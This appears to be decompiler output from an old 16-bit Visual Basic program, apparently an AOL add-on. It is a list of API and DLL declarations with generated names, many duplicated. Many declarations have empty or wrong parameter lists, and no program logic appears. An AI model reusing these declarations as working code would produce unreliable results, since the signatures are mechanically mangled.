Declare Function extfn90F8 Lib "User" Alias "GetWindowText" (ByVal p1%, ByVal p2$, ByVal p3%) As Integer
Declare Function extfn9440 Lib "User" Alias "GetWindowtextlength" () As Integer
Declare Function extfn9168 Lib "User" Alias "GetWindowWord" () As Integer
Declare Function extfn9830 Lib "Kernel" Alias "GetWinFlags" () As Long
Declare Function extfn8A30 Lib "Kernel" Alias "GlobalCompact" () As Long
Declare Function extfn92B8 Lib "User" Alias "iswindowvisible" () As Integer
Declare Function extfnA828 Lib "Kernel" Alias "lstrlen" () As Integer
Declare Function extfn97C0 Lib "Kernel" Alias "lStrln" () As Integer
Declare Function extfn9C90 Lib "MMSystem" Alias "MciSendString" () As Long
Declare Function extfnA5C0 Lib "VBMsg.Vbx" Alias "ptConvertUShort" () As Long
Declare Function extfnA668 Lib "VBMsg.Vbx" Alias "ptGetControlModel" () As Long
Declare Function extfnA6A0 Lib "VBMsg.Vbx" Alias "ptGetControlName" () As String
Declare Function extfnA400 Lib "VBMsg.Vbx" Alias "ptGetVariableAddress" () As Long
Declare Function extfnA438 Lib "VBMsg.Vbx" Alias "ptGetIntegerFromAddress" () As Integer
Declare Function extfnA3C8 Lib "VBMsg.Vbx" Alias "ptGetVariableAddress" () As Long
Declare Function extfnA470 Lib "VBMsg.Vbx" Alias "ptGetLongFromAddress" () As Long
Declare Function extfnA390 Lib "VBMsg.Vbx" Alias "ptGetVariableAddress" () As Long
Declare Function extfnA4A8 Lib "VBMsg.Vbx" Alias "ptGetStringFromAddress" () As String
Declare Function extfnA358 Lib "VBMsg.Vbx" Alias "ptGetVariableAddress" () As Long
Declare Function extfnA320 Lib "VBMsg.Vbx" Alias "ptGetVariableAddress" () As Long
Declare Function extfnA550 Lib "VBMsg.Vbx" Alias "ptHiWord" () As Integer
Declare Function extfnA518 Lib "VBMsg.Vbx" Alias "ptLoWord" () As Integer
Declare Function extfnA4E0 Lib "VBMsg.Vbx" Alias "ptMakelParam" () As Long
Declare Function extfnA588 Lib "VBMsg.Vbx" Alias "ptMakeUShort" () As Integer
Declare Function extfnA5F8 Lib "VBMsg.Vbx" Alias "ptMessagetoText" () As String
Declare Function extfnA630 Lib "VBMsg.Vbx" Alias "ptRecreateControlHwnd" () As Long
Declare Function extfn96E0 Lib "User" Alias "ReleaseDC" () As Integer
Declare Function extfn9C20 Lib "GDI" Alias "SelectObject" () As Integer
Declare Function extfn8EC8 Lib "User" Alias "SendMessage" () As Long
Declare Function extfn8F38 Lib "User" Alias "SendMessage" () As Long
Declare Function extfn8F00 Lib "User" Alias "SendMessage" () As Long
Declare Function extfnA780 Lib "User" Alias "SendMessage" () As Long
Declare Function extfn9210 Lib "User" Alias "SetActiveWindow" () As Integer
Declare Function extfn8C60 Lib "User" Alias "SetClassWord" () As Integer
Declare Function extfnA7B8 Lib "User" Alias "SetCursor" () As Integer
Declare Function extfn9280 Lib "User" Alias "SetSysModalWindow" () As Integer
Declare Function extfn9B40 Lib "GDI" Alias "SetTextColor" () As Long
Declare Function extfn91A0 Lib "User" Alias "SetWindowText" () As Integer
Declare Function extfnA7F0 Lib "User" Alias "showwindow" () As Integer
Declare Function extfn9C58 Lib "MMSystem" Alias "sndplaysound" () As Integer
Declare Function extfn9750 Lib "User" Alias "SwapMouseButton" () As Integer
Declare Function extfn9AD0 Lib "GDI" Alias "TextOut" () As Integer
Declare Function extfnA710 Lib "VBRun300.Dll" Alias "VarPtr" () As Long
Declare Function extfnA748 Lib "VBStr.Dll" Alias "vbeNumChildWindow" () As Integer
Declare Function extfn9050 Lib "User" Alias "WinHelp" () As Integer
Declare Function extfn90C0 Lib "User" Alias "WinHelp" () As Integer
Declare Function extfn9088 Lib "User" Alias "WinHelp" () As Integer
Declare Function extfn9948 Lib "Kernel" Alias "WritePrivateProfileString" () As Integer
Declare Function extfn9A28 Lib "Kernel" Alias "WriteProfileString" () As Integer
Declare Function extfnAA58 Lib "User" Alias "enablewindow" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfnAA20 Lib "311.dll" Alias "AOLgetcombo" () As Integer
Declare Function extfnA9E8 Lib "311.dll" Alias "AOLgetlist" (ByVal p1%, ByVal p2$) As Integer
Declare Function extfnAB70 Lib "User" Alias "getmenuitemid" () As Integer
Declare Function extfn89F8 Lib "User" Alias "GETnextwindow" () As Integer
Declare Function extfnAB38 Lib "User" Alias "getsubmenu" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfnABA8 Lib "User" Alias "gettopwindow" () As Integer
Declare Function extfnAAC8 Lib "User" Alias "iswindowenabled" (ByVal p1%) As Integer
Declare Function extfnAA90 Lib "User" Alias "iswindowvisible" () As Integer
Declare Function extfnABE0 Lib "Kernel" Alias "_lread" () As Integer
Declare Function extfn89C0 Lib "Kernel" Alias "_lwrite" () As Integer
Declare Function extfnA978 Lib "User" Alias "messagebox" () As Integer
Declare Function extfnA9B0 Lib "User" Alias "GETnextwindow" () As Integer
Declare Function extfnAB00 Lib "User" Alias "getmenu" (ByVal p1%) As Integer
Declare Function extfn8BF0 Lib "User" Alias "SendMessage" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4&) As Long
Declare Function extfn8CD0 Lib "User" Alias "SetFocus" () As Integer
Declare Function extfnCC10 Lib "bubble.dll" Alias "CreateBubble" () As Integer
Declare Function extfnA8D0 Lib "bubble.dll" Alias "DeleteBubble" () As Integer
Declare Function extfnCBD8 Lib "User" Alias "SetWindowPos" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4%, ByVal p5%, ByVal p6%, ByVal p7%) As Integer
Declare Function extfnA940 Lib "ole02.dll" Alias "findchildbyclass" (ByVal p1%, ByVal p2$) As Integer
Declare Function extfn8988 Lib "VBWFind.Dll" Alias "Findchildbytitle" (ByVal p1%, ByVal p2$) As Integer
Declare Function extfn8AA0 Lib "User" Alias "FindWindow" (ByVal p1$, ByVal p2&) As Integer
Declare Function extfn98A0 Lib "User" Alias "GetClassName" () As Integer
Declare Function extfn9BB0 Lib "User" Alias "GetParent" () As Integer
Declare Function extfn94E8 Lib "User" Alias "GetWindow" () As Integer
Declare Function extfnA278 Lib "User" Alias "GetWindowText" (ByVal p1%, ByVal p2$, ByVal p3%) As Integer
Declare Function extfn9130 Lib "User" Alias "SendMessage" () As Long
Declare Function extfn8DB0 Lib "User" Alias "SendMessage" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4&) As Integer
Declare Function extfn9EC0 Lib "User" Alias "SendMessage" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4$) As Long
Declare Sub extsubACF8 Lib "User" Alias "DrawMenuBar" ()
Declare Sub extsubAE48 Lib "APIGuide.Dll" Alias "agCopyData" ()
Declare Sub extsubAE80 Lib "APIGuide.Dll" Alias "agCopyData" ()
Declare Sub extsubAEB8 Lib "APIGuide.Dll" Alias "agDWordTo2Integers" ()
Declare Sub extsubAEF0 Lib "APIGuide.Dll" Alias "agOutp" ()
Declare Sub extsubAF28 Lib "APIGuide.Dll" Alias "agOutpw" ()
Declare Sub extsubAE10 Lib "GDI" Alias "DeleteObject" ()
Declare Sub extsubAD30 Lib "User" Alias "GetScrollRange" ()
Declare Sub extsubACC0 Lib "User" Alias "GetWindowRect" ()
Declare Sub extsubAF98 Lib "VBMsg.Vbx" Alias "ptCopyTypeToAddress" ()
Declare Sub extsubAF60 Lib "VBMsg.Vbx" Alias "ptGetTypeFromAddress" ()
Declare Sub extsubAFD0 Lib "VBMsg.Vbx" Alias "ptSetControlModel" ()
Declare Sub extsubADD8 Lib "GDI" Alias "Rectangle" ()
Declare Sub extsubADA0 Lib "GDI" Alias "SetBKColor" ()
Declare Sub extsubAD68 Lib "User" Alias "SetCursorPos" ()
Declare Sub extsubA908 Lib "User" Alias "SetWindowPos" ()
Declare Sub extsubAC88 Lib "User" Alias "ShowOwnedPopups" ()
Declare Sub extsubAC50 Lib "User" Alias "UpdateWindow" ()
Declare Sub extsubB008 Lib "User" Alias "bringwindowtotop" (ByVal p1%)
Declare Sub extsubAC18 Lib "User" Alias "SetWindowPos" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4%, ByVal p5%, ByVal p6%, ByVal p7%)
Declare Function extfn4098 Lib "User" Alias "showwindow" () As Integer
Declare Function extfn3960 Lib "User" Alias "AppendMenu" () As Integer
Declare Function extfn3B20 Lib "VBWFind.Dll" Alias "findchildbyclass" (ByVal p1%, ByVal p2$) As Integer
Declare Function extfn3998 Lib "User" Alias "DeleteMenu" () As Integer
Declare Function extfn3B58 Lib "VBWFind.Dll" Alias "Findchildbytitle" (ByVal p1%, ByVal p2$) As Integer
Declare Function extfn3AB0 Lib "User" Alias "FindWindow" (ByVal p1 As Any, ByVal p2 As Any) As Integer
Declare Function extfn3DF8 Lib "User" Alias "GetClipboardData" () As Integer
Declare Function extfn3DC0 Lib "User" Alias "GetMenuItemCount" () As Integer
Declare Function extfn39D0 Lib "User" Alias "GetMenuString" () As Integer
Declare Function extfn3D50 Lib "User" Alias "GetWindow" () As Integer
Declare Function extfn3928 Lib "User" Alias "InsertMenu" () As Integer
Declare Function extfn3A78 Lib "User" Alias "SendMessage" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4&) As Long
Declare Function extfn3C00 Lib "User" Alias "SendMessage" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4$) As Long
Declare Function extfn38B8 Lib "User" Alias "modifymenu" () As Integer
Declare Function extfn3BC8 Lib "User" Alias "GETnextwindow" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfn3AE8 Lib "User" Alias "GetParent" (ByVal p1%) As Integer
Declare Function extfn3CE0 Lib "MMSystem" Alias "sndplaysound" () As Integer
Declare Function extfn3B90 Lib "User" Alias "SetFocus" (ByVal p1%) As Integer
Declare Function extfn3C70 Lib "User" Alias "SetParent" () As Integer
Declare Function extfn3A40 Lib "User" Alias "GetWindowText" (ByVal p1%, ByVal p2$, ByVal p3%) As Integer
Declare Function extfn3730 Lib "User" Alias "AppendMenu" () As Integer
Declare Function extfn3768 Lib "User" Alias "DeleteMenu" () As Integer
Declare Function extfn38F0 Lib "VBWFind.Dll" Alias "Findchildbytitle" (ByVal p1%, ByVal p2$) As Integer
Declare Function extfn3848 Lib "User" Alias "FindWindow" (ByVal p1$, ByVal p2&) As Integer
Declare Function extfn37A0 Lib "User" Alias "GetMenuString" () As Integer
Declare Function extfn36F8 Lib "User" Alias "InsertMenu" () As Integer
Declare Function extfn3810 Lib "User" Alias "SendMessage" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4&) As Long
Declare Function extfn36C0 Lib "User" Alias "modifymenu" () As Integer
Declare Function extfn3880 Lib "User" Alias "GetParent" (ByVal p1%) As Integer
Declare Function extfn3A08 Lib "MMSystem" Alias "sndplaysound" () As Integer
Declare Function extfn37D8 Lib "User" Alias "GetWindowText" () As Integer
Declare Function extfn3E30 Lib "User" Alias "enablewindow" () As Integer
Declare Function extfn3D88 Lib "311.dll" Alias "AOLgetcombo" () As Integer
Declare Function extfn3D18 Lib "311.dll" Alias "AOLgetlist" (ByVal p1%, ByVal p2$) As Integer
Declare Function extfn3F10 Lib "User" Alias "getmenu" () As Integer
Declare Function extfn3F80 Lib "User" Alias "getmenuitemid" () As Integer
Declare Function extfn4060 Lib "User" Alias "GETnextwindow" () As Integer
Declare Function extfn3F48 Lib "User" Alias "getsubmenu" () As Integer
Declare Function extfn3FB8 Lib "User" Alias "gettopwindow" () As Integer
Declare Function extfn3EA0 Lib "User" Alias "iswindowenabled" () As Integer
Declare Function extfn3E68 Lib "User" Alias "iswindowvisible" () As Integer
Declare Function extfn3FF0 Lib "Kernel" Alias "_lread" () As Integer
Declare Function extfn4028 Lib "Kernel" Alias "_lwrite" () As Integer
Declare Function extfn3C38 Lib "User" Alias "messagebox" () As Integer
Declare Function extfn3CA8 Lib "User" Alias "GETnextwindow" () As Integer
Declare Function extfn3ED8 Lib "User" Alias "showwindow" () As Integer
Declare Sub extsub4178 Lib "User" Alias "DrawMenuBar" ()
Declare Sub extsub41B0 Lib "User" Alias "MoveWindow" ()
Declare Sub extsub41E8 Lib "User" Alias "SetWindowPos" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4%, ByVal p5%, ByVal p6%, ByVal p7%)
Declare Sub extsub40D0 Lib "User" Alias "DrawMenuBar" ()
Declare Sub extsub4108 Lib "User" Alias "MoveWindow" ()
Declare Sub extsub4140 Lib "User" Alias "SetWindowPos" ()
Declare Sub extsub4220 Lib "User" Alias "bringwindowtotop" ()
Declare Function extfn47D8 Lib "User" Alias "AppendMenu" () As Integer
Declare Function extfn4810 Lib "User" Alias "AppendMenu" () As Integer
Declare Function extfn4730 Lib "User" Alias "SetFocus" () As Integer
Declare Function extfn4FF0 Lib "User" Alias "InsertMenu" () As Integer
Declare Function extfn4B20 Lib "User" Alias "FindWindow" () As Integer
Declare Function extfn46F8 Lib "User" Alias "SetActiveWindow" () As Integer
Declare Function extfn4E30 Lib "User" Alias "GetParent" (ByVal p1%) As Integer
Declare Function extfn5290 Lib "MMSYSTEM.DLL" Alias "sndplaysound" (ByVal p1$, ByVal p2%) As Integer
Declare Function extfn4BC8 Lib "User" Alias "GetCursor" () As Integer
Declare Function extfn4F80 Lib "User" Alias "GetWindowtextlength" () As Integer
Declare Function extfn4998 Lib "User" Alias "EnableMenuItem" () As Integer
Declare Function extfn4928 Lib "User" Alias "DestroyMenu" () As Integer
Declare Function extfn4FB8 Lib "User" Alias "GetWindowWord" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfn5140 Lib "GDI" Alias "SetBKColor" () As Long
Declare Function extfn4C00 Lib "User" Alias "GetDC" () As Integer
Declare Function extfn4F10 Lib "User" Alias "getwindowtask" () As Integer
Declare Function extfn49D0 Lib "User" Alias "enablewindow" () As Integer
Declare Function extfn4B58 Lib "User" Alias "GetActiveWindow" () As Integer
Declare Function extfn4960 Lib "User" Alias "destroywindow" () As Integer
Declare Function extfn48B8 Lib "User" Alias "createwindow" () As Integer
Declare Function extfn4880 Lib "User" Alias "CreatePopupMenu" () As Integer
Declare Function extfn5108 Lib "User" Alias "SetActiveWindow" () As Integer
Declare Function extfn5178 Lib "User" Alias "SetFocus" () As Integer
Declare Function extfn51E8 Lib "User" Alias "showwindow" () As Integer
Declare Function extfn5220 Lib "MMSystem" Alias "sndplaysound" () As Integer
Declare Function extfn5258 Lib "MMSystem" Alias "waveOutGetNumDevs" () As Integer
Declare Function extfn48F0 Lib "User" Alias "DeleteMenu" () As Integer
Declare Function extfn4ED8 Lib "User" Alias "GetWindow" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfn4F48 Lib "User" Alias "GetWindowText" (ByVal p1%, ByVal p2$, ByVal p3%) As Integer
Declare Function extfn4B90 Lib "User" Alias "GetClassName" (ByVal p1%, ByVal p2$, ByVal p3%) As Integer
Declare Function extfn4C70 Lib "User" Alias "GetFocus" () As Integer
Declare Function extfn4DF8 Lib "User" Alias "GETnextwindow" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfn4CA8 Lib "User" Alias "getmenu" (ByVal p1%) As Integer
Declare Function extfn4C38 Lib "User" Alias "GetDeskTopWindow" () As Integer
Declare Function extfn4CE0 Lib "User" Alias "GetMenuItemCount" () As Integer
Declare Function extfn4D18 Lib "User" Alias "getmenuitemid" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfn4D50 Lib "User" Alias "GetMenuState" () As Integer
Declare Function extfn4E68 Lib "User" Alias "getsubmenu" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfn4D88 Lib "User" Alias "GetMenuString" () As Integer
Declare Function extfn4AE8 Lib "User" Alias "FindWindow" (ByVal p1$, ByVal p2 As Any) As Integer
Declare Function extfn4EA0 Lib "User" Alias "gettopwindow" () As Integer
Declare Function extfn5098 Lib "User" Alias "SendMessage" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4&) As Long
Declare Function extfn50D0 Lib "User" Alias "SendMessage" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4$) As Long
Declare Function extfn5060 Lib "User" Alias "SendMessage" (ByVal p1%, ByVal p2%, ByVal p3%, p4 As Any) As Long
Declare Function extfn4A08 Lib "User" Alias "ExitWindows" () As Integer
Declare Function extfn47A0 Lib "311.dll" Alias "AOLgetlist" (ByVal p1%, ByVal p2$) As Integer
Declare Function extfn4DC0 Lib "311.dll" Alias "AOLgetlist" () As Integer
Declare Function extfn4768 Lib "APIGuide.Dll" Alias "agGetStringFromLPSTR" (ByVal p1&) As String
Declare Function extfn5028 Lib "VBMsg.Vbx" Alias "ptGetStringFromAddress" () As String
Declare Function extfn4A40 Lib "VBWFind.Dll" Alias "FindChild" () As Integer
Declare Function extfn4AB0 Lib "VBWFind.Dll" Alias "Findchildbytitle" (ByVal p1%, ByVal p2$) As Integer
Declare Function extfn4A78 Lib "VBWFind.Dll" Alias "findchildbyclass" (ByVal p1%, ByVal p2$) As Integer
Declare Function extfn51B0 Lib "User" Alias "SetWindowPos" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4%, ByVal p5%, ByVal p6%, ByVal p7%) As Integer
Declare Function extfn4848 Lib "User" Alias "CreateMenu" () As Integer
Declare Sub extsub5370 Lib "User" Alias "SetWindowText" ()
Declare Sub extsub5300 Lib "User" Alias "closewindow" ()
Declare Sub extsub5338 Lib "User" Alias "MoveWindow" ()
Declare Sub extsub52C8 Lib "User" Alias "bringwindowtotop" ()
Declare Sub extsub53A8 Lib "User" Alias "SetWindowPos" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4%, ByVal p5%, ByVal p6%, ByVal p7%)
Declare Function extfn31E0 Lib "Kernel" Alias "lstrlen" () As Integer
Declare Function extfn2D10 Lib "User" Alias "AppendMenu" () As Integer
Declare Function extfn2D80 Lib "User" Alias "CreatePopupMenu" () As Integer
Declare Function extfn3020 Lib "User" Alias "GETnextwindow" () As Integer
Declare Function extfn2DF0 Lib "User" Alias "DeleteMenu" () As Integer
Declare Function extfn2F78 Lib "User" Alias "getmenu" (ByVal p1%) As Integer
Declare Function extfn2FB0 Lib "User" Alias "getmenuitemid" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfn3090 Lib "User" Alias "getsubmenu" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfn2FE8 Lib "User" Alias "GetMenuString" (ByVal p1%, ByVal p2%, ByVal p3$, ByVal p4%, ByVal p5%) As Integer
Declare Function extfn32C0 Lib "User" Alias "SetFocus" (ByVal p1%) As Integer
Declare Function extfn2ED0 Lib "User" Alias "GetActiveWindow" () As Integer
Declare Function extfn3288 Lib "User" Alias "SendMessage" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4$) As Integer
Declare Function extfn3100 Lib "User" Alias "GetWindow" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfn32F8 Lib "User" Alias "SetParent" () As Integer
Declare Function extfn2F08 Lib "User" Alias "GetClassName" () As Integer
Declare Function extfn2CA0 Lib "APIGuide.Dll" Alias "agGetStringFromLPSTR" () As String
Declare Function extfn3250 Lib "User" Alias "SendMessage" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4&) As Long
Declare Function extfn3058 Lib "User" Alias "GetParent" (ByVal p1%) As Integer
Declare Function extfn3330 Lib "User" Alias "SetWindowPos" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4%, ByVal p5%, ByVal p6%, ByVal p7%) As Integer
Declare Function extfn30C8 Lib "User" Alias "GetTickCount" () As Long
Declare Function extfn2CD8 Lib "311.dll" Alias "AOLgetlist" () As Integer
Declare Function extfn31A8 Lib "Kernel" Alias "lstrlen" () As Integer
Declare Function extfn2E28 Lib "VBWFind.Dll" Alias "findchildbyclass" (ByVal p1%, ByVal p2$) As Integer
Declare Function extfn2E60 Lib "VBWFind.Dll" Alias "Findchildbytitle" (ByVal p1%, ByVal p2$) As Integer
Declare Function extfn2D48 Lib "bubble.dll" Alias "CreateBubble" () As Integer
Declare Function extfn2DB8 Lib "bubble.dll" Alias "DeleteBubble" () As Integer
Declare Function extfn3138 Lib "User" Alias "GetWindowFromClass" () As Integer
Declare Function extfn2F40 Lib "User" Alias "GetFocus" () As Integer
Declare Function extfn3218 Lib "User" Alias "SendMessage" (ByVal p1%, ByVal p2%, ByVal p3%, p4&) As Long
Declare Function extfn3368 Lib "MMSYSTEM.DLL" Alias "sndplaysound" (ByVal p1$, ByVal p2%) As Integer
Declare Function extfn2E98 Lib "User" Alias "FindWindow" (ByVal p1$, ByVal p2 As Any) As Integer
Declare Function extfn3170 Lib "User" Alias "GetWindowText" (ByVal p1%, ByVal p2$, ByVal p3%) As Integer
Declare Function extfn9D0 Lib "User" Alias "ExitWindow" () As Integer
Declare Function extfnFF0 Lib "User" Alias "GetParent" (ByVal p1%) As Integer
Declare Function extfn1CD8 Lib "User" Alias "SetParent" () As Integer
Declare Function extfnF10 Lib "User" Alias "GetMessage" () As Integer
Declare Function extfn1AA8 Lib "User" Alias "SendMessage" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4 As Any) As Long
Declare Function extfn1B18 Lib "User" Alias "SendMessage" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4$) As Long
Declare Function extfn1AE0 Lib "User" Alias "SendMessage" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4&) As Long
Declare Function extfn848 Lib "User" Alias "CreateMenu" () As Integer
Declare Function extfn768 Lib "User" Alias "AppendMenu" () As Integer
Declare Function extfn7A0 Lib "User" Alias "AppendMenu" () As Integer
Declare Function extfn1488 Lib "User" Alias "InsertMenu" () As Integer
Declare Function extfn1FB0 Lib "User" Alias "WinHelp" () As Integer
Declare Function extfn2020 Lib "User" Alias "WinHelp" () As Integer
Declare Function extfn1FE8 Lib "User" Alias "WinHelp" () As Integer
Declare Function extfn13A8 Lib "User" Alias "GetWindowText" (ByVal p1%, ByVal p2$, ByVal p3%) As Integer
Declare Function extfn1418 Lib "User" Alias "GetWindowWord" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfnBC8 Lib "User" Alias "GetActiveWindow" () As Integer
Declare Function extfn1B88 Lib "User" Alias "SetActiveWindow" (ByVal p1%) As Integer
Declare Function extfn11B0 Lib "User" Alias "GetSysModalWindow" () As Integer
Declare Function extfn1D10 Lib "User" Alias "SetSysModalWindow" () As Integer
Declare Function extfn14C0 Lib "User" Alias "iswindowvisible" () As Integer
Declare Function extfnC70 Lib "User" Alias "GetCurrentTime" () As Long
Declare Function extfn1108 Lib "User" Alias "GetScrollPos" () As Integer
Declare Function extfnCA8 Lib "User" Alias "GetCursor" () As Integer
Declare Function extfnC00 Lib "User" Alias "GetClassName" (ByVal p1%, ByVal p2$, ByVal p3%) As Integer
Declare Function extfn1220 Lib "User" Alias "GetSystemMenu" () As Integer
Declare Function extfnF80 Lib "User" Alias "GetNextDlgTabItem" () As Integer
Declare Function extfn13E0 Lib "User" Alias "GetWindowtextlength" (ByVal p1%) As Integer
Declare Function extfn1290 Lib "User" Alias "gettopwindow" () As Integer
Declare Function extfn7D8 Lib "User" Alias "ArrangeIconicWindow" () As Integer
Declare Function extfnE30 Lib "User" Alias "getmenu" () As Integer
Declare Function extfnEA0 Lib "User" Alias "getmenuitemid" () As Integer
Declare Function extfnE68 Lib "User" Alias "GetMenuItemCount" () As Integer
Declare Function extfnED8 Lib "User" Alias "GetMenuState" () As Integer
Declare Function extfn1178 Lib "User" Alias "getsubmenu" () As Integer
Declare Function extfn1258 Lib "User" Alias "GetSystemMetrics" () As Integer
Declare Function extfnD18 Lib "User" Alias "GetDeskTopWindow" () As Integer
Declare Function extfnCE0 Lib "User" Alias "GetDC" () As Integer
Declare Function extfn1A38 Lib "User" Alias "ReleaseDC" () As Integer
Declare Function extfn1338 Lib "User" Alias "GetWindowDC" () As Integer
Declare Function extfn1E98 Lib "User" Alias "SwapMouseButton" () As Integer
Declare Function extfn960 Lib "User" Alias "ENumChildWindow" () As Integer
Declare Function extfn1530 Lib "Kernel" Alias "lStrln" () As Integer
Declare Function extfn1370 Lib "Kernel" Alias "getwindowdirectory" () As Integer
Declare Function extfn1450 Lib "Kernel" Alias "GetWinFlags" () As Long
Declare Function extfn12C8 Lib "Kernel" Alias "GetVersion" () As Long
Declare Function extfnDC0 Lib "Kernel" Alias "GetFreeSpace" () As Long
Declare Function extfn11E8 Lib "Kernel" Alias "getsystemdirectory" () As Integer
Declare Function extfn2058 Lib "Kernel" Alias "WritePrivateProfileString" (ByVal p1$, ByVal p2$, ByVal p3$, ByVal p4$) As Integer
Declare Function extfn1060 Lib "Kernel" Alias "GetPrivateProfileString" () As Integer
Declare Function extfn1098 Lib "Kernel" Alias "GetProfileInt" () As Integer
Declare Function extfn10D0 Lib "Kernel" Alias "GetProfileString" () As Integer
Declare Function extfn2090 Lib "Kernel" Alias "WriteProfileString" () As Integer
Declare Function extfn1028 Lib "Kernel" Alias "GetPrivateProfileInt" () As Integer
Declare Function extfnD50 Lib "GDI" Alias "GetDeviceCaps" () As Integer
Declare Function extfn1ED0 Lib "GDI" Alias "TextOut" () As Integer
Declare Function extfnB90 Lib "GDI" Alias "FloodFill" () As Integer
Declare Function extfn1D48 Lib "GDI" Alias "SetTextColor" () As Long
Declare Function extfn810 Lib "GDI" Alias "BitBlt" () As Integer
Declare Function extfn880 Lib "GDI" Alias "CreateSolidBrush" () As Integer
Declare Function extfn1A70 Lib "GDI" Alias "SelectObject" () As Integer
Declare Function extfn1E60 Lib "MMSystem" Alias "sndplaysound" (ByVal p1$, ByVal p2%) As Integer
Declare Function extfn1568 Lib "MMSystem" Alias "MciSendString" () As Long
Declare Function extfnA40 Lib "VBWFind.Dll" Alias "FindChild" () As Integer
Declare Function extfnAB0 Lib "VBWFind.Dll" Alias "Findchildbytitle" (ByVal p1%, ByVal p2$) As Integer
Declare Function extfnA78 Lib "VBWFind.Dll" Alias "findchildbyclass" (ByVal p1%, ByVal p2$) As Integer
Declare Function extfn3B0 Lib "APIGuide.Dll" Alias "agGetControlHwnd" () As Integer
Declare Function extfn420 Lib "APIGuide.Dll" Alias "agGetInstance" () As Integer
Declare Function extfn340 Lib "APIGuide.Dll" Alias "agGetAddressForObject" () As Long
Declare Function extfn298 Lib "APIGuide.Dll" Alias "agGetAddressForObject" () As Long
Declare Function extfn2D0 Lib "APIGuide.Dll" Alias "agGetAddressForObject" () As Long
Declare Function extfn308 Lib "APIGuide.Dll" Alias "agGetAddressForObject" () As Long
Declare Function extfn378 Lib "APIGuide.Dll" Alias "agGetAddressForVBString" () As Long
Declare Function extfn3E8 Lib "APIGuide.Dll" Alias "agGetControlName" () As String
Declare Function extfn650 Lib "APIGuide.Dll" Alias "agXPixelsToTwips" () As Long
Declare Function extfn6C0 Lib "APIGuide.Dll" Alias "agYPixelsToTwips" () As Long
Declare Function extfn688 Lib "APIGuide.Dll" Alias "agXTwipsToPixels" () As Integer
Declare Function extfn6F8 Lib "APIGuide.Dll" Alias "agYTwipsToPixels" () As Integer
Declare Function extfn1B8 Lib "APIGuide.Dll" Alias "agDeviceCapabilities" () As Long
Declare Function extfn1F0 Lib "APIGuide.Dll" Alias "agDeviceMode" () As Integer
Declare Function extfn260 Lib "APIGuide.Dll" Alias "agExtDeviceMode" () As Integer
Declare Function extfn4C8 Lib "APIGuide.Dll" Alias "agInp" () As Integer
Declare Function extfn500 Lib "APIGuide.Dll" Alias "agInpw" () As Integer
Declare Function extfn490 Lib "APIGuide.Dll" Alias "agHugeOffset" () As Long
Declare Function extfn5A8 Lib "APIGuide.Dll" Alias "agVBGetVersion" () As Integer
Declare Function extfn5E0 Lib "APIGuide.Dll" Alias "agVBSendControlMsg" () As Long
Declare Function extfn618 Lib "APIGuide.Dll" Alias "agVBSetControlFlags" () As Long
Declare Function extfn928 Lib "APIGuide.Dll" Alias "dwVBSetControlFlags" () As Long
Declare Function extfn1840 Lib "VBMsg.Vbx" Alias "ptGetVariableAddress" () As Long
Declare Function extfn17D0 Lib "VBMsg.Vbx" Alias "ptGetVariableAddress" () As Long
Declare Function extfn1760 Lib "VBMsg.Vbx" Alias "ptGetVariableAddress" () As Long
Declare Function extfn16F0 Lib "VBMsg.Vbx" Alias "ptGetVariableAddress" () As Long
Declare Function extfn1680 Lib "VBMsg.Vbx" Alias "ptGetVariableAddress" () As Long
Declare Function extfn16B8 Lib "VBMsg.Vbx" Alias "ptGetIntegerFromAddress" () As Integer
Declare Function extfn1728 Lib "VBMsg.Vbx" Alias "ptGetLongFromAddress" () As Long
Declare Function extfn1798 Lib "VBMsg.Vbx" Alias "ptGetStringFromAddress" () As String
Declare Function extfn18E8 Lib "VBMsg.Vbx" Alias "ptMakelParam" () As Long
Declare Function extfn18B0 Lib "VBMsg.Vbx" Alias "ptLoWord" () As Integer
Declare Function extfn1878 Lib "VBMsg.Vbx" Alias "ptHiWord" () As Integer
Declare Function extfn1920 Lib "VBMsg.Vbx" Alias "ptMakeUShort" () As Integer
Declare Function extfn15A0 Lib "VBMsg.Vbx" Alias "ptConvertUShort" () As Long
Declare Function extfn1958 Lib "VBMsg.Vbx" Alias "ptMessagetoText" () As String
Declare Function extfn1990 Lib "VBMsg.Vbx" Alias "ptRecreateControlHwnd" () As Long
Declare Function extfn1610 Lib "VBMsg.Vbx" Alias "ptGetControlModel" () As Long
Declare Function extfn1648 Lib "VBMsg.Vbx" Alias "ptGetControlName" () As String
Declare Function extfn730 Lib "311.dll" Alias "AOLgetlist" (ByVal p1%, ByVal p2$) As Integer
Declare Function extfnF48 Lib "311.dll" Alias "AOLgetlist" () As Integer
Declare Function extfn1F40 Lib "VBRun300.Dll" Alias "VarPtr" () As Long
Declare Function extfn1F78 Lib "VBStr.Dll" Alias "vbeNumChildWindow" () As Integer
